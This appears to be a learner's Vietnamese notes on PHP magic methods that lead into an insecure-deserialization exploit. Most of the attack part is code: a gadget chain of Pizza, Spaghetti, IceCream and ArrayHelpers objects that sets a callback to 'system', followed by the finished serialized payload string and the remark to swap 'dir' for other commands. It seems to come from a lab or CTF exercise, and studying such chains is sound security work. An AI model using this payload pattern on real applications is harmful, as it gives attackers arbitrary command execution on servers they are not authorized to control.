- __destruct() – Hủy đối tượng

- Khi nào chạy: Tự động gọi khi đối tượng bị hủy (kết thúc scope, cuối request/script, hoặc GC thu dọn).
- Dùng để làm gì: Dọn dẹp tài nguyên (đóng file/socket), flush buffer, ghi log, xoá file tạm…

- __get() – Bắt truy cập thuộc tính không tồn tại/không truy cập được
Khi nào chạy: Khi bạn truy cập thuộc tính mà:

Không tồn tại, hoặc

Tồn tại nhưng không truy cập được trong ngữ cảnh (private/protected từ bên ngoài).

Tác dụng: Cho phép bạn “ảo hóa” thuộc tính: lazy-load, proxy, đọc từ mảng nội bộ, cấu hình…

__invoke() – Biến đối tượng thành “hàm”

Khi nào chạy: Khi bạn “gọi” một đối tượng như gọi hàm: $obj(...).

Dùng để làm gì: Tạo “functor”/callable có trạng thái; tiện cho DI, middleware, rule engine, hoặc callback cho array_map, call_user_func, v.v.

- lỗ hổng: ko hiểu j cả (app using unserialize function)

- trước khi serialize
```
$ArrayHelpers = new ArrayHelpers(['dir']);
$ArrayHelpers->callback = 'system';

$IceCream = new IceCream();
$IceCream->flavors = $ArrayHelpers;

$Spaghetti = new Spaghetti();
$Spaghetti->sauce = $IceCream;
$Spaghetti->waht;

$Pizza = new Pizza();
$Pizza->size = $Spaghetti;
```
- Sau khi serialize:
`O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";N;}`:
O:5:"Pizza":3: → một object (O) của lớp tên "Pizza" (độ dài 5), có 3 thuộc tính.
Bên trong { ... } là các cặp tên thuộc tính → giá trị:
s:5:"price"; N; → thuộc tính price (tên string dài 5) có giá trị NULL (N).
s:6:"cheese"; N; → cheese = NULL.
s:4:"size"; N; → size = NULL.
```
O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";O:9:"Spaghetti":3:{s:5:"sauce";O:8:"IceCream":2:{s:7:"flavors";O:21:"\Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:1:{i:0;s:3:"dir";}i:2;a:1:{s:8:"callback";s:6:"system";}i:3;N;}s:7:"topping";N;}s:7:"noodles";N;s:7:"portion";N;}}
```
thay dir bằng các command khác
